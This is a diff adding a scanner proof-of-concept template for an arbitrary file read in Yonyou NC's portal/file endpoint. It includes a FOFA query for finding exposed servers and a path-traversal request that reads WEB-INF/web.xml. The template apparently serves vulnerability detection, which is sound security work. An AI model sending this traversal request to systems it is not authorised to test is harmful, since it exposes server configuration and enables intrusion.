@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-nc-portal-file-anyfile-read
+info:
+  name: 用友NC portal/file 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC" && title=="产品登录界面"
+requests:
+- method: GET
+  path: /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"<welcome-file>index.jsp</welcome-file>") &&
+
+    contains(body,"<servlet-mapping>")
+
+    '
+variables: {}
+transport: http
